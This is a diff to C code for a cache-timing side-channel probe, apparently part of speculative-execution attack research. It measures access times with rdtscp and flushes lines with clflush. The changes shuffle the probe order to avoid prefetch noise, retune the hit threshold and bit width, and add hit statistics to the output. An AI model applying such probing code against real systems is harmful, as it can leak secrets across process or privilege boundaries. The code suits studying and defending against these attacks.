@@ -66,17 +66,17 @@ void check_probes() {
     uint64_t t0, t1;
     uint8_t *addr;
 
-    int i;
+    int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        addr = &probe_buf[i*cur_probe_space];
+		mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
-        asm volatile( "movb (%%rbx), %%al\n"
-            :: "b"(addr) : "rax");
+        asm volatile( "movb (%%rbx), %%al\n" :: "b"(addr) : "rax");
         t1 = _rdtscp(&junk);
-        if (t1-t0 < 140) {
+        if (t1-t0 < 150) {
             cache_hits++;
             tot_time += t1-t0;
-            results[i]++;
+            results[mix_i]++;
         }
     }
     tot_runs++;
@@ -172,7 +172,7 @@ void measure() {
 
     int misses = 0;
     uint64_t k = 1;
-    uint64_t width = 10;
+    uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
     uint64_t final_i;
@@ -181,7 +181,7 @@ void measure() {
     while (1) {
         for (i=0; i<MAX_ITERATIONS; i++) {
             _mm_clflush(&fn_ptr);
-            _mm_clflush(&jmp_ptr);
+            //_mm_clflush(&jmp_ptr);
             indirect(&jmp_ptr);
             //((void(*)(void *))map)(&jmp_ptr);
             usleep(1);
@@ -194,7 +194,7 @@ void measure() {
 
         if (hit_miss){
             final_i = construct_result(k, width, top_k_i); 
-            printf("[%08lX]\n\n", final_i);
+            printf("[%08lX]  - Cache Hits: %ld  -- avg:%ld\n\n", final_i, cache_hits, cache_hits/2000);
 
             signal_idx++;
             misses = 0;
